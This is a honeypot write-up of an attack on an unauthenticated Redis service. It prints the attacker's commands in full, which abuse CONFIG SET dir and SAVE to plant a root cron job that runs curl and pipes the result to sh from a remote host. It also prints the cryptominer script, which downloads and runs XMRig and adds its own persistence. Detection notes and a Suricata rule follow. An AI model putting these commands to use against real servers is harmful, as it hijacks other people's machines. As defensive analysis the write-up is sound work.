+++
title = "Case File 02: An Exposed Redis Instance Recruits Itself Into a Miner"
date = "2025-03-27"
description = "A fake unauthenticated Redis service walks through the full cron-persistence chain an opportunistic cryptominer uses to take root."
tags = ["honeypot", "redis", "cryptomining"]
toc = true
[extra]
older = "writeups/case-file-01-cowrie-mirai-checkin.md"
newer = "writeups/case-file-03-upx-loader-smb.md"
+++

Redis has no authentication by default, and a sensor exposing port 6379 with no password gets exploited within hours of going live, not days. This capture is a textbook example of the `SET` + `CONFIG SET dir` + `SAVE` technique that turns an unauthenticated key-value store into an arbitrary file write, and from there into a root cron job.

<!-- more -->

## The exploitation chain

The attacker connected with the plain `redis-cli` protocol and issued four commands in immediate sequence, with no reconnaissance beforehand — this group clearly runs the same script against every open Redis they find:

```text
SET backup1 "\n\n*/1 * * * * curl -fsSL http://198.51.100.9/x.sh | sh\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

`SET` writes a string containing a valid crontab line into a Redis key. `CONFIG SET dir` points Redis's RDB save location at the system crontab directory. `SAVE` forces a dump of the in-memory dataset to disk at that location, and because the "value" was crafted to be valid crontab syntax padded with newlines, the resulting file is a working cron entry once the surrounding Redis binary noise is ignored by `cron`'s parser.

## The payload

`x.sh` fetched a shell script that is almost entirely commodity XMRig deployment boilerplate:

```bash
#!/bin/sh
pkill -f xmrig 2>/dev/null
mkdir -p /tmp/.x
curl -fsSL http://198.51.100.9/xmrig.tar.gz -o /tmp/.x/x.tar.gz
tar -xzf /tmp/.x/x.tar.gz -C /tmp/.x
chmod +x /tmp/.x/xmrig
/tmp/.x/xmrig -o pool.example:14444 -u <wallet-removed> --donate-level 1 -B
echo "* * * * * /tmp/.x/xmrig -o pool.example:14444 -u <wallet-removed> --donate-level 1 -B" >> /var/spool/cron/root
```

Two things stand out. First, the script re-adds its own persistence via a second cron write directly to the file, independent of the Redis trick — a belt-and-suspenders approach common in this family, so removing the Redis-planted job alone does not evict it. Second, the `--donate-level 1` flag is a signature of a specific builder tool circulating on a few cracking forums; the default XMRig donate level is 1 already, so its explicit presence here is more a fingerprint of the script generator than an attacker choice.

## Detection notes

- Any `CONFIG SET dir` followed by `SAVE` on an internet-facing Redis instance is exploitation, full stop — there is no legitimate reason for an external client to redirect the RDB save path.
- The cron-line-via-SET pattern (a value containing `\n\n*/1 * * * *`) is trivially detectable in Redis `MONITOR` output or a network IDS rule matching on the literal bytes.
- Requiring `requirepass` and binding Redis to a private interface eliminates this entire class of attack; protected mode alone is not sufficient once an attacker can reach the port at all.

```suricata
alert tcp any any -> any 6379 (msg:"Redis CONFIG SET dir cron-persistence attempt"; flow:to_server; content:"CONFIG"; content:"SET"; distance:0; content:"dir"; distance:0; content:"/var/spool/cron"; distance:0; classtype:attempted-admin; sid:9000102; rev:1;)
```
